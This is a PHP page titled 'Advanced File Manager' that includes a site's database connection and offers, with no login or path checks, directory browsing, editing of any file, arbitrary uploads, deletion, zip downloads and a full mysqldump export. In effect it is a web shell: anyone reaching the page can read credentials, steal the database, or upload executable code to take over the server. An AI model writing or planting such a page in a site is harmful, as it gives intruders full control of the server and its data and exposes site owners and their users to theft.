<?php
include "../../conn.php"; // connection included (no need to set db manually)

$path = isset($_GET['path']) ? $_GET['path'] : getcwd();
$path = realpath($path);

// ==== SQL EXPORT ====
if (isset($_GET['downloadsql'])) {
    $filename = 'db_backup_' . date("Y-m-d_H-i-s") . '.sql';
    header('Content-Type: application/octet-stream');
    header('Content-Disposition: attachment; filename=' . $filename);
    passthru("mysqldump -u$dbuser -p$dbpass $dbname");
    exit;
}

// ==== ZIP SELECTED FILES/FOLDERS ====
if (isset($_POST['zip_selected']) && !empty($_POST['selected_items'])) {
    $zipFile = sys_get_temp_dir() . '/selected_' . time() . '.zip';
    $zip = new ZipArchive();
    if ($zip->open($zipFile, ZipArchive::CREATE | ZipArchive::OVERWRITE)) {
        foreach ($_POST['selected_items'] as $item) {
            $item = realpath($item);
            if (is_file($item)) {
                $zip->addFile($item, basename($item));
            } elseif (is_dir($item)) {
                $files = new RecursiveIteratorIterator(
                    new RecursiveDirectoryIterator($item, RecursiveDirectoryIterator::SKIP_DOTS),
                    RecursiveIteratorIterator::LEAVES_ONLY
                );
                foreach ($files as $file) {
                    if (!$file->isDir()) {
                        $filePath = $file->getRealPath();
                        $relativePath = substr($filePath, strlen($item) + 1);
                        $zip->addFile($filePath, basename($item) . '/' . $relativePath);
                    }
                }
            }
        }
        $zip->close();
        if (ob_get_level()) ob_end_clean();
        header('Content-Type: application/zip');
        header('Content-Disposition: attachment; filename="selected_items.zip"');
        header('Content-Length: ' . filesize($zipFile));
        readfile($zipFile);
        unlink($zipFile);
        exit;
    } else {
        die("❌ ZIP creation failed.");
    }
}

// ==== DELETE ====
if (isset($_GET['delete'])) {
    $target = urldecode($_GET['delete']);
    if (is_file($target)) unlink($target);
    elseif (is_dir($target)) rmdir($target);
    header("Location: ?path=" . urlencode($path));
    exit;
}

// ==== NEW FILE ====
if (isset($_POST['newfile'])) {
    file_put_contents($path . '/' . $_POST['newfile'], '');
    header("Location: ?path=" . urlencode($path));
    exit;
}

// ==== NEW FOLDER ====
if (isset($_POST['newfolder'])) {
    mkdir($path . '/' . $_POST['newfolder']);
    header("Location: ?path=" . urlencode($path));
    exit;
}

// ==== UPLOAD ====
if (isset($_POST['upload'])) {
    move_uploaded_file($_FILES['file']['tmp_name'], $path . '/' . $_FILES['file']['name']);
    header("Location: ?path=" . urlencode($path));
    exit;
}

// ==== EDIT ====
if (isset($_GET['edit'])) {
    $file = urldecode($_GET['edit']);
    if (!file_exists($file)) die("❌ File not found.");
    if (isset($_POST['content'])) {
        file_put_contents($file, $_POST['content']);
        header("Location: ?path=" . urlencode(dirname($file)));
        exit;
    }
    $content = file_get_contents($file);
    echo "<!DOCTYPE html><html><head><title>Edit</title><style>
        body { background: #1e1e2e; color: #fff; font-family: monospace; padding: 20px; }
        textarea { width: 100%; height: 80vh; background: #1b1b1b; color: #00ff90; border: none; padding: 10px; }
        button { padding: 10px 20px; margin-top: 10px; background: #00ff90; color: black; border: none; cursor: pointer; }
    </style></head><body>";
    echo "<h2>Editing: $file</h2>
    <form method='post'>
        <textarea name='content'>" . htmlspecialchars($content) . "</textarea><br>
        <button type='submit'>💾 Save</button>
    </form>
    </body></html>";
    exit;
}

$files = scandir($path);
?>

<!DOCTYPE html>
<html>
<head>
    <title>🧰 Advanced File Manager</title>
    <style>
        body {
            margin: 0; font-family: Arial, sans-serif;
            background: linear-gradient(135deg, #25283D, #1F1F2E);
            color: #eee;
        }
        header {
            background: #313454;
            padding: 15px 25px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            color: #00ff90;
        }
        .tools a, .tools button {
            background: #00ff90;
            color: #000;
            padding: 8px 14px;
            border: none;
            margin-right: 10px;
            text-decoration: none;
            border-radius: 4px;
            font-weight: bold;
            cursor: pointer;
        }
        .main { padding: 20px; }
        table { width: 100%; background: #2a2d40; border-collapse: collapse; margin-top: 20px; }
        th, td { padding: 10px; border: 1px solid #444; }
        th { background: #1f1f2e; color: #00ff90; }
        .create-area input, .tools input[type='file'] {
            padding: 6px; margin-right: 10px; background: #222; color: #00ff90; border: 1px solid #444; border-radius: 3px;
        }
    </style>
</head>
<body>
<header>
    <h2>📂 File Manager</h2>
    <div class="tools">
        <a href="?path=<?= urlencode(dirname($path)) ?>">🔙 Go Up</a>
        <a href="?path=<?= urlencode($path) ?>&downloadzip=1">📦 ZIP Current</a>
        <a href="?downloadsql=1">🗃️ Export DB</a>
        <form method="POST" enctype="multipart/form-data" style="display:inline;">
            <input type="file" name="file">
            <button name="upload">📤 Upload</button>
        </form>
    </div>
</header>

<div class="main">
    <h3>Current Path: <?= htmlspecialchars($path) ?></h3>

    <form method="post" class="create-area">
        <input type="text" name="newfile" placeholder="New file name" required>
        <button type="submit">📄 Create File</button>
    </form>

    <form method="post" class="create-area">
        <input type="text" name="newfolder" placeholder="New folder name" required>
        <button type="submit">📁 Create Folder</button>
    </form>

    <form method="post">
        <table>
            <tr><th>Select</th><th>Name</th><th>Type</th><th>Action</th></tr>
            <?php foreach ($files as $f):
                if ($f === '.' || $f === '..') continue;
                $fullpath = $path . '/' . $f; ?>
                <tr>
                    <td><input type="checkbox" name="selected_items[]" value="<?= htmlspecialchars($fullpath) ?>"></td>
                    <td>
                        <?= is_dir($fullpath) ? "<a href='?path=" . urlencode($fullpath) . "'>📁 $f</a>" : "📄 $f"; ?>
                    </td>
                    <td><?= is_dir($fullpath) ? 'Dir' : 'File' ?></td>
                    <td>
                        <?php if (is_file($fullpath)): ?>
                            <a href="?edit=<?= urlencode($fullpath) ?>">✏️ Edit</a>
                        <?php endif; ?>
                        <a href="?delete=<?= urlencode($fullpath) ?>" onclick="return confirm('Delete this item?')">❌ Delete</a>
                    </td>
                </tr>
            <?php endforeach; ?>
        </table>
        <br>
        <button type="submit" name="zip_selected">📦 ZIP Selected</button>
    </form>
</div>

</body>
</html>